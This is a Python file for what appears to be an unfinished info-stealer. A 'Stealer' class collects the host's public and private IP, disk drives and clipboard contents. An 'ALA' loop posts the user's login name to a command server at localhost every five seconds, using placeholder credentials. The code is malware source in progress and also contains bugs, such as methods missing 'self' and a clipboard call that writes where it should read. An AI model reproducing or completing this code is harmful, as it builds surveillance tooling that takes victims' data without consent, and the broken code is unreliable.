import asyncio
import aiohttp

import json
import sys, os
import socket
import psutil
import pyperclip as clipboard

from typing import Any

class Codes:

    online = "Online"
    offline = "Offline"

class Commands:

    online_status = "Online Status"

class Stealer:

    async def get_public_ip():

        async with aiohttp.ClientSession() as session:

            async with session.get("https://api64.ipify.org") as response:

                public_ip = await response.text()

                return public_ip
            
    async def get_private_ip():

        private_ip = socket.gethostbyname(socket.gethostname())
    
        return private_ip

    async def get_drives():

        partitions = psutil.disk_partitions()

        drives = [partition.device for partition in partitions]

        return drives
    
    async def get_clipboard():

        data = clipboard.copy()

        if type(data) == str:

            return data
        
        else:

            return "Error"
    
    #todo INSERT CLIPBOARD
    #todo GET RUNNING APPS
    

class ALA:

    def __init__(self):

        self.url = "http://localhost:8000/api"
        self.header = {"Content-Type": "application/json"}
        self.login_name = os.getlogin()

    def process_json(self, command: str, data: Any) -> tuple: #! insert values into json

        json = {

            "command" : command,

            "data": {

                "message" : data,
            },

            "login" : {

                "username" : "testusername",
                "password" : "testpassword",
            },

            "authorization" : {

                "channel_id" : "testchannel",
                "key" : "testkey"
            }
        }

        return json
    
    async def post_request(self): #! example of post request

        async with aiohttp.ClientSession() as session:

            async with session.post(self.url, json = self.process_json(command = "data", data = "hello"), headers = {"Content-Type": "application/json"}) as response:

                #// response_data = await response.json()

                if response.status != 200:

                    print(f"Server answer bad: {response.status}")

                else:

                    print("Success")

    async def get_request(self): #! example of get request

        async with aiohttp.ClientSession() as session:

            async with session.get(self.url) as response:

                print(f"GET-Response: {await response.text()}")

    async def send_online_status(self) -> None:

        async with aiohttp.ClientSession() as session:

            async with session.post(
                
                self.url, 
                json = self.process_json(command = Commands.online_status, data = f"{Codes.online},{self.login_name}"),
                headers = self.header) as response:

                return None

    async def ala(self): #! Mainloop

        while True:

            try:

                #await self.post_request()

                await self.send_online_status()
                

            except Exception as network_error:
                
                print(network_error)

            

            await asyncio.sleep(5)

    def run(self): #! Run

        asyncio.run(self.ala())

if __name__ == "__main__":

    ala = ALA()

    ala.run()
